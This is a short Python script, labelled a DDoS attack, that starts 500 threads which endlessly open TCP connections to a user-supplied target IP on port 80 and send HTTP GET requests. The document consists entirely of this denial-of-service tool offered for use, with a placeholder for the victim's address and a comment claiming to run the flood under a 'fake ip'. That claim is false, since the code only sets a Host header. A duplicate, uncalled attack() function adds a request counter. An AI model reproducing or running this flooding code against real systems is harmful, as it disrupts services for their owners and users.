#//---LIBRARIES---//
import socket
import threading

#//---GLOBAL-VARIEBILES---//
target = '00.0.0.000' #replace with your target ip
fake_ip = '184.21.25.32' #fake ip under which we will run the ddos
port = 80 #replace if you are using other port
numberOfRequests = 0

#//---MAIN---//
def DDOS():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(500):
    thread = threading.Thread(target=DDOS)
    thread.start()


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global numberOfRequests
        numberOfRequests += 1
        print(numberOfRequests)

        s.close()
